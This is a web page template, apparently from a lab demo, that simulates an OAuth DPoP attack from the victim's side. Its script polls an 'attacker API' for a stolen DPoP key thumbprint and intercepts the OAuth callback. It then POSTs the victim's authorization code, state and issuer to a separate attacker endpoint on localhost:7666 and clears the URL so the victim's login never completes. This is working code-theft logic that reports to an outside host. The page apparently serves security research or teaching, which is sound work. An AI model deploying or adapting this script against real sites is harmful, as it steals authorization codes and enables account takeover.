@{
    ViewData["Title"] = "OAuth DPoP Attack - Victim Mode";
}

<div class="container">
    <h1 class="text-primary">🎯 OAuth DPoP Attack - Victim Mode</h1>

    <div class="alert alert-info">
        <strong>Simulation:</strong> This page simulates a victim's browser that has been compromised with malicious JavaScript.
    </div>

    <div class="card mb-3">
        <div class="card-body">
            <h5 class="card-title">What's Happening</h5>
            <ol>
                <li>Your browser is polling the attacker's API for a stolen DPoP proof</li>
                <li>Once received, it will automatically initiate a silent OAuth flow using the stolen proof</li>
                <li>When you authenticate, the authorization code will be intercepted and sent to the attacker</li>
                <li>The attacker can then use your authorization code to complete their login</li>
            </ol>
        </div>
    </div>

    <div class="card mb-3">
        <div class="card-body">
            <div class="mb-3">
                <label for="session-id-input" class="form-label"><strong>Enter Attacker's Session ID:</strong></label>
                <input type="text" class="form-control" id="session-id-input" placeholder="e.g., session_abc123xyz">
                <small class="form-text text-muted">Copy the Session ID from the attacker's browser</small>
            </div>
            <p><strong>Current Session ID:</strong> <code id="session-id">Not initialized</code></p>
            <p><strong>Status:</strong> <span id="victim-status" class="badge bg-secondary">Waiting</span></p>
            <div id="controls">
                <button class="btn btn-primary" onclick="initVictim()">Start Victim Simulation</button>
                <button class="btn btn-warning" onclick="manualAuth()" disabled id="auth-btn">Manually Authenticate</button>
                <button class="btn btn-secondary" onclick="checkStatus()">Check Status</button>
            </div>
        </div>
    </div>

    <div class="card">
        <div class="card-body">
            <h5 class="card-title">Activity Log</h5>
            <pre id="status" style="background: #f5f5f5; padding: 10px; border-radius: 4px; max-height: 400px; overflow-y: auto;">Ready. Click "Start Victim Simulation" to begin.</pre>
        </div>
    </div>
</div>

<script src="https://localhost:7666/attack.js"></script>
<script>
    let attackInstance = null;
    let pollingInterval = null;

    function initVictim() {
        attackInstance = new OAuthAttack();
        // Don't call initVictim() which starts the old polling
        attackInstance.mode = 'victim';
        attackInstance.interceptRequests();
        attackInstance.interceptAuthCallback();

        document.getElementById('session-id').textContent = attackInstance.sessionId;
        document.getElementById('victim-status').textContent = 'Polling for DPoP proof...';
        document.getElementById('victim-status').classList.remove('bg-secondary');
        document.getElementById('victim-status').classList.add('bg-warning');
        document.getElementById('auth-btn').disabled = false;

        updateStatus('Victim mode initialized.\nPolling attacker API for any available DPoP JKT...');

        // Start monitoring for any available DPoP JKT (using our custom generic endpoint)
        pollingInterval = setInterval(checkForDPoP, 2000);
    }

    async function checkForDPoP() {
        if (!attackInstance) return;

        try {
            // Poll the generic endpoint that returns the latest DPoP JKT
            const response = await fetch(`https://localhost:7666/api/attack/dpop/latest`);

            if (response.ok) {
                const dpopData = await response.json();
                clearInterval(pollingInterval);

                // Store the attacker's session ID so we can send the code back to them
                sessionStorage.setItem('attacker_session_id', dpopData.sessionId);

                document.getElementById('victim-status').textContent = 'DPoP Proof Received!';
                document.getElementById('victim-status').classList.remove('bg-warning');
                document.getElementById('victim-status').classList.add('bg-success');

                updateStatus('✅ Stolen DPoP JKT received!\nAttacker Session: ' + dpopData.sessionId + '\nDPoP JKT: ' + dpopData.dpopProof + '\n\nClick "Manually Authenticate" to trigger the OAuth flow.');
            }
        } catch (error) {
            // Continue polling
        }
    }

    function manualAuth() {
        if (!attackInstance) {
            alert('Please initialize victim mode first');
            return;
        }

        updateStatus('Redirecting to OAuth login. Authorization code will be intercepted...');

        // Set a flag so we know to intercept the callback
        sessionStorage.setItem('intercept_callback', 'true');

        window.location.href = '/Home/Secure';
    }

    async function checkStatus() {
        if (!attackInstance) return;

        try {
            const response = await fetch(`https://localhost:7666/api/attack/status/${attackInstance.sessionId}`);
            const status = await response.json();

            updateStatus(JSON.stringify(status, null, 2));
        } catch (error) {
            console.error('Failed to check status:', error);
        }
    }

    function updateStatus(message) {
        document.getElementById('status').textContent = message;
    }

    // Check if we're returning from OAuth callback
    window.addEventListener('load', () => {
        const urlParams = new URLSearchParams(window.location.search);
        const code = urlParams.get('code');
        const shouldIntercept = sessionStorage.getItem('intercept_callback');

        if (code && shouldIntercept === 'true' && attackInstance) {
            sessionStorage.removeItem('intercept_callback');

            const state = urlParams.get('state');
            const issuer = urlParams.get('iss');

            updateStatus('🚨 INTERCEPTED Authorization Code!\nCode: ' + code + '\nSending to attacker API...');

            // Send to attacker API
            fetch(`https://localhost:7666/api/attack/code`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    sessionId: attackInstance.sessionId,
                    code: code,
                    state: state || '',
                    issuerUrl: issuer || ''
                })
            }).then(() => {
                updateStatus('✅ Authorization code successfully sent to attacker!\n\nCode: ' + code);

                document.getElementById('victim-status').textContent = 'Code Exfiltrated!';
                document.getElementById('victim-status').classList.remove('bg-success');
                document.getElementById('victim-status').classList.add('bg-danger');

                // Clear the URL to prevent the OAuth flow from completing
                window.history.replaceState({}, '', '/Home/AttackVictim');
            });
        }
    });
</script>

